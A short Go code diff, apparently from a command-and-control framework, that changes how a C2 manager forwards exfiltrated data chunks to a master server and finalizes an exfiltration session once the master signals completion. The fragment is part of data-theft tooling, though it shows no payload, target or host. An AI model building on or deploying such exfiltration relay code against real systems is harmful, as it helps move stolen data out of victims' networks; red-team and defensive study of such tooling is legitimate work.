@@ -1144,8 +1144,19 @@ func (c2 *C2Manager) submitExfilChunkToMaster(session *ExfilSession, meta *Exfil
 	}
 	c2.mutex.RUnlock()
 
-	if err := masterClient.SubmitExfilChunk(req); err != nil && c2.debug {
-		logf("[Exfil] Failed to forward chunk %d for session %s: %v", meta.ChunkIndex, session.SessionID, err)
+	completed, err := masterClient.SubmitExfilChunk(req)
+	if err != nil {
+		if c2.debug {
+			logf("[Exfil] Failed to forward chunk %d for session %s: %v", meta.ChunkIndex, session.SessionID, err)
+		}
+		return
+	}
+
+	if completed {
+		if c2.debug {
+			logf("[Exfil] Master signaled session %s is complete", session.SessionID)
+		}
+		c2.finalizeExfilSession(session)
 	}
 }
 
